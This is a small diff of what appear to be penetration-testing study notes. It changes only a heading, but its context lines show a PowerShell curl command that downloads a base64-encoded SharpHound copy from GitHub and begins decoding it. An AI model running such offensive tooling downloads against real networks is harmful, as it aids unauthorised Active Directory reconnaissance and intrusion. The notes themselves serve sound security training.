@@ -1,4 +1,4 @@
-# DOWNLOAD - SHARPHOUND
+### DOWNLOAD - SHARPHOUND
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/base64/SharpHound.txt -outfile SharpHound.txt
 $Filename = ".\SharpHound.txt"
